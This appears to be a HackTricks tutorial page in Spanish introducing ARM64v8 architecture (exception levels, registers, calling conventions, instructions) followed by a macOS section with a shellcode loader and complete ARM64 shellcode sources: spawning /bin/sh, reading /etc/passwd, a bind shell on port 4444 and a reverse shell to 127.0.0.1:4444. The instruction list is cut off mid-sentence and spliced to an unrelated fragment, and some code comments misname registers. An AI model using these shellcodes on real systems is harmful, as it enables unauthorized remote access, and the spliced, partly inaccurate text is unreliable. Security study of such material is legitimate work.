# Introducción a ARM64v8

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Niveles de Excepción - EL (ARM64v8)**

En la arquitectura ARMv8, los niveles de ejecución, conocidos como Niveles de Excepción (ELs), definen el nivel de privilegio y las capacidades del entorno de ejecución. Hay cuatro niveles de excepción, que van desde EL0 hasta EL3, cada uno con un propósito diferente:

1. **EL0 - Modo Usuario**:
* Este es el nivel menos privilegiado y se utiliza para ejecutar código de aplicaciones regulares.
* Las aplicaciones que se ejecutan en EL0 están aisladas entre sí y del software del sistema, mejorando la seguridad y la estabilidad.
2. **EL1 - Modo Kernel del Sistema Operativo**:
* La mayoría de los kernels de sistemas operativos se ejecutan en este nivel.
* EL1 tiene más privilegios que EL0 y puede acceder a recursos del sistema, pero con algunas restricciones para garantizar la integridad del sistema.
3. **EL2 - Modo Hipervisor**:
* Este nivel se utiliza para la virtualización. Un hipervisor que se ejecuta en EL2 puede gestionar múltiples sistemas operativos (cada uno en su propio EL1) que se ejecutan en el mismo hardware físico.
* EL2 proporciona características para la aislación y control de los entornos virtualizados.
4. **EL3 - Modo Monitor Seguro**:
* Este es el nivel más privilegiado y a menudo se utiliza para arranque seguro y entornos de ejecución confiables.
* EL3 puede gestionar y controlar accesos entre estados seguros y no seguros (como arranque seguro, sistema operativo confiable, etc.).

El uso de estos niveles permite una forma estructurada y segura de gestionar diferentes aspectos del sistema, desde aplicaciones de usuario hasta el software del sistema más privilegiado. El enfoque de ARMv8 para los niveles de privilegio ayuda a aislar efectivamente los diferentes componentes del sistema, mejorando así la seguridad y robustez del sistema.

## **Registros (ARM64v8)**

ARM64 tiene **31 registros de propósito general**, etiquetados de `x0` a `x30`. Cada uno puede almacenar un valor de **64 bits** (8 bytes). Para operaciones que solo requieren valores de 32 bits, los mismos registros se pueden acceder en un modo de 32 bits usando los nombres w0 a w30.

1. **`x0`** a **`x7`** - Estos se utilizan típicamente como registros temporales y para pasar parámetros a subrutinas.
* **`x0`** también lleva el dato de retorno de una función
2. **`x8`** - En el kernel de Linux, `x8` se utiliza como el número de llamada al sistema para la instrucción `svc`. **¡En macOS se utiliza el x16!**
3. **`x9`** a **`x15`** - Más registros temporales, a menudo utilizados para variables locales.
4. **`x16`** y **`x17`** - **Registros de Llamada Intraprocedural**. Registros temporales para valores inmediatos. También se utilizan para llamadas a funciones indirectas y stubs de PLT (Tabla de Enlace de Procedimientos).
* **`x16`** se utiliza como el **número de llamada al sistema** para la instrucción **`svc`** en **macOS**.
5. **`x18`** - **Registro de plataforma**. Puede utilizarse como un registro de propósito general, pero en algunas plataformas, este registro está reservado para usos específicos de la plataforma: Puntero al bloque de entorno de hilo actual en Windows, o para apuntar a la estructura de tarea actualmente **ejecutando en el kernel de linux**.
6. **`x19`** a **`x28`** - Estos son registros guardados por el llamado. Una función debe preservar los valores de estos registros para su llamador, por lo que se almacenan en la pila y se recuperan antes de volver al llamador.
7. **`x29`** - **Puntero de marco** para llevar un registro del marco de pila. Cuando se crea un nuevo marco de pila porque se llama a una función, el registro **`x29`** se **almacena en la pila** y la **nueva** dirección del puntero de marco es (dirección **`sp`**) se **almacena en este registro**.
* Este registro también puede utilizarse como un **registro de propósito general** aunque generalmente se utiliza como referencia a **variables locales**.
8. **`x30`** o **`lr`**- **Registro de enlace**. Contiene la **dirección de retorno** cuando se ejecuta una instrucción `BL` (Branch with Link) o `BLR` (Branch with Link to Register) almacenando el valor de **`pc`** en este registro.
* También podría utilizarse como cualquier otro registro.
9. **`sp`** - **Puntero de pila**, utilizado para llevar un registro de la parte superior de la pila.
* el valor de **`sp`** siempre debe mantenerse al menos con una **alineación de cuádruple palabra** o podría ocurrir una excepción de alineación.
10. **`pc`** - **Contador de programa**, que apunta a la instrucción actual. Este registro solo puede actualizarse a través de generaciones de excepciones, retornos de excepciones y ramificaciones. Las únicas instrucciones ordinarias que pueden leer este registro son las instrucciones de ramificación con enlace (BL, BLR) para almacenar la dirección de **`pc`** en **`lr`** (Registro de Enlace).
11. **`xzr`** - **Registro cero**. También llamado **`wzr`** en su forma de registro de **32 bits**. Puede utilizarse para obtener fácilmente el valor cero (operación común) o para realizar comparaciones usando **`subs`** como **`subs XZR, Xn, #10`** almacenando los datos resultantes en ninguna parte (en **`xzr`**).

Los registros **`Wn`** son la versión de **32 bits** del registro **`Xn`**.

### SIMD y Registros de Punto Flotante

Además, hay otros **32 registros de 128 bits de longitud** que se pueden utilizar en operaciones optimizadas de datos múltiples de instrucción única (SIMD) y para realizar aritmética de punto flotante. Estos se llaman registros Vn aunque también pueden operar en **64 bits**, **32 bits**, **16 bits** y **8 bits** y entonces se llaman **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** y **`Bn`**.

### Registros del Sistema

**hay cientos de registros del sistema**, también llamados registros de propósito especial (SPRs), se utilizan para **monitorear** y **controlar** el **comportamiento de los procesadores**.\
Solo se pueden leer o configurar utilizando la instrucción especial dedicada **`mrs`** y **`msr`**.

Los registros especiales **`TPIDR_EL0`** y **`TPIDDR_EL0`** son comunes cuando se hace ingeniería inversa. El sufijo `EL0` indica el **nivel mínimo de excepción** desde el cual se puede acceder al registro (en este caso, EL0 es el nivel regular de excepción (privilegio) con el que se ejecutan los programas regulares).\
A menudo se utilizan para almacenar la **dirección base del área de almacenamiento local del hilo** de memoria. Por lo general, el primero es legible y escribible para programas que se ejecutan en EL0, pero el segundo se puede leer desde EL0 y escribir desde EL1 (como el kernel).

* `mrs x0, TPIDR_EL0 ; Leer TPIDR_EL0 en x0`
* `msr TPIDR_EL0, X0 ; Escribir TPIDR_EL0 en x1`

### **PSTATE**

**PSTATE** son varios componentes serializados en el registro especial **`SPSR_ELx`** visible por el sistema operativo. Estos son los campos accesibles:

* Las banderas de condición **`N`**, **`Z`**, **`C`** y **`V`**:
* **`N`** significa que la operación produjo un resultado negativo
* **`Z`** significa que la operación produjo cero
* **`C`** significa que la operación llevó
* **`V`** significa que la operación produjo un desbordamiento con signo:
* La suma de dos números positivos produce un resultado negativo.
* La suma de dos números negativos produce un resultado positivo.
* En la resta, cuando se resta un número negativo grande de un número positivo más pequeño (o viceversa), y el resultado no se puede representar dentro del rango del tamaño de bit dado.
* La bandera de **ancho de registro actual (`nRW`)**: Si la bandera tiene el valor 0, el programa se ejecutará en el estado de ejecución AArch64 una vez reanudado.
* El **Nivel de Excepción actual** (**`EL`**): Un programa regular que se ejecuta en EL0 tendrá el valor 0
* La bandera de **paso único** (**`SS`**): Utilizada por los depuradores para realizar un paso único configurando la bandera SS en 1 dentro de **`SPSR_ELx`** a través de una excepción. El programa ejecutará un paso y emitirá una excepción de paso único.
* La bandera de estado de excepción ilegal (**`IL`**): Se utiliza para marcar cuando un software privilegiado realiza una transferencia de nivel de excepción inválida, esta bandera se establece en 1 y el procesador desencadena una excepción de estado ilegal.
* Las banderas **`DAIF`**: Estas banderas permiten a un programa privilegiado enmascarar selectivamente ciertas excepciones externas.
* Las banderas de selección de puntero de pila (**`SPS`**): Los programas privilegiados que se ejecutan en EL1 y superior pueden cambiar entre usar su propio registro de puntero de pila y el del modelo de usuario (por ejemplo, entre `SP_EL1` y `EL0`). Este cambio se realiza escribiendo en el registro especial **`SPSel`**. Esto no se puede hacer desde EL0.

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

## **Convención de Llamadas (ARM64v8)**

La convención de llamadas ARM64 especifica que los **primeros ocho parámetros** de una función se pasan en los registros **`x0` a `x7`**. **Parámetros adicionales** se pasan en la **pila**. El valor de **retorno** se devuelve en el registro **`x0`**, o también en **`x1`** si es de 128 bits. Los registros **`x19`** a **`x30`** y **`sp`** deben ser **preservados** a través de las llamadas a funciones.

Al leer una función en ensamblador, busque el **prólogo y epílogo de la función**. El **prólogo** generalmente implica **guardar el puntero de marco (`x29`)**, **establecer** un **nuevo puntero de marco**, y **asignar espacio en la pila**. El **epílogo** generalmente implica **restaurar el puntero de marco guardado** y **retornar** de la función.

### Convención de Llamadas en Swift

Swift tiene su propia **convención de llamadas** que se puede encontrar en [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instrucciones Comunes (ARM64v8)**

Las instrucciones ARM64 generalmente tienen el **formato `opcode dst, src1, src2`**, donde **`opcode`** es la **operación** a realizar (como `add`, `sub`, `mov`, etc.), **`dst`** es el registro **destino** donde se almacenará el resultado, y **`src1`** y **`src2`** son los registros **fuente**. También se pueden usar valores inmediatos en lugar de registros fuente.

* **`mov`**: **Mover** un valor de un **registro** a otro.
* Ejemplo: `mov x0, x1` — Esto mueve el valor de `x1` a `x0`.
* **`ldr`**: **Cargar** un valor de la **memoria** en un **registro**.
* Ejemplo: `ldr x0, [x1]` — Esto carga un valor de la ubicación de memoria señalada por `x1` en `x0`.
* **`str`**: **Almacenar** un valor de un **registro** en la **memoria**.
* Ejemplo: `str x0, [x1]` — Esto almacena el valor en `x0` en la ubicación de memoria señalada por `x1`.
* **`ldp`**: **Cargar Par de Registros**. Esta instrucción **carga dos registros** de **ubicaciones de memoria consecutivas**. La dirección de memoria se forma típicamente sumando un desplazamiento al valor en otro registro.
* Ejemplo: `ldp x0, x1, [x2]` — Esto carga `x0` y `x1` de las ubicaciones de memoria en `x2` y `x2 + 8`, respectivamente.
* **`stp`**: **Almacenar Par de Registros**. Esta instrucción **almacena dos registros** en **ubicaciones de memoria consecutivas**. La dirección de memoria se forma típicamente sumando un desplazamiento al valor en otro registro.
* Ejemplo: `stp x0, x1, [x2]` — Esto almacena `x0` y `x1` en las ubicaciones de memoria en `x2` y `x2 + 8`, respectivamente.
* **`add`**: **Sumar** los valores de dos registros y almacenar el resultado en un registro.
* Ejemplo: `add x0, x1, x2` — Esto suma los valores en `x1` y `x2` y almacena el resultado en `x0`.
* **`sub`**: **Restar** los valores de dos registros y almacenar el resultado en un registro.
* Ejemplo: `sub x0, x1, x2` — Esto resta el valor en `x2` de `x1` y almacena el resultado en `x0`.
* **`mul`**: **Multiplicar** los valores de **dos registros** y almacenar el resultado en un registro.
* Ejemplo: `mul x0, x1, x2` — Esto multiplica los valores en `x1` y `x2` y almacena el resultado en `x0`.
* **`div`**: **Dividir** el valor de un registro por otro y almacenar el resultado en un registro.
* Ejemplo: `div x0, x1, x2` — Esto divide el valor en `x1` por `x2` y almacena el resultado en `x0`.
* **`bl`**: **Rama** con enlace, utilizada para **llamar** a una **subrutina**. Almacena la **dirección de retorno en `x30`**.
* Ejemplo: `bl myFunction` — Esto llama a la función `myFunction` y almacena la dirección de retorno en `x30`.
* **`blr`**: **Rama** con Enlace a Registro, utilizada para **llamar** a una **subrutina** donde el objetivo está **especificado** en un **registro**. Almacena la dirección de retorno en `x30`.
* Ejemplo: `blr x1` — Esto llama a la función cuya dirección está contenida en `x1` y al
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Retorno**: `ret` (devuelve el control al llamador utilizando la dirección en el registro de enlace)

## Estado de Ejecución AARCH32

Armv8-A soporta la ejecución de programas de 32 bits. **AArch32** puede ejecutarse en uno de **dos conjuntos de instrucciones**: **`A32`** y **`T32`** y puede alternar entre ellos mediante **`interworking`**.\
Los programas de 64 bits **Privilegiados** pueden programar la **ejecución de programas de 32 bits** ejecutando una transferencia de nivel de excepción al 32 bits menos privilegiado.\
Note que la transición de 64 bits a 32 bits ocurre con una disminución del nivel de excepción (por ejemplo, un programa de 64 bits en EL1 activando un programa en EL0). Esto se hace estableciendo el **bit 4 de** **`SPSR_ELx`** registro especial **a 1** cuando el hilo del proceso `AArch32` está listo para ser ejecutado y el resto de `SPSR_ELx` almacena el CPSR del programa **`AArch32`**. Luego, el proceso privilegiado llama a la instrucción **`ERET`** para que el procesador transite a **`AArch32`** entrando en A32 o T32 dependiendo del CPSR**.**

## macOS

### Syscalls de BSD

Consulte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Los syscalls de BSD tendrán **x16 > 0**.

### Mach Traps

Consulte [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). Los Mach traps tendrán **x16 < 0**, por lo que necesitará llamar a los números de la lista anterior con un **menos**: **`_kernelrpc_mach_vm_allocate_trap`** es **`-10`**.

También puede revisar **`libsystem_kernel.dylib`** en un desensamblador para encontrar cómo llamar a estos (y a los de BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
A veces es más fácil revisar el código **descompilado** de **`libsystem_kernel.dylib`** que revisar el **código fuente** porque el código de varios syscalls (BSD y Mach) se genera mediante scripts (revisa los comentarios en el código fuente), mientras que en la dylib puedes encontrar lo que se está llamando.
{% endhint %}

### Shellcodes

Para compilar:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extraer los bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Código en C para probar el shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tomado de [**aquí**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) y explicado.

{% tabs %}
{% tab title="con adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="con pila" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
#### Leer con cat

El objetivo es ejecutar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, por lo que el segundo argumento (x1) es un array de parámetros (lo que en memoria significa una pila de direcciones).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar comando con sh desde un fork para que el proceso principal no se detenga
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell de [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) en el **puerto 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Conexión inversa

Desde [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell a **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
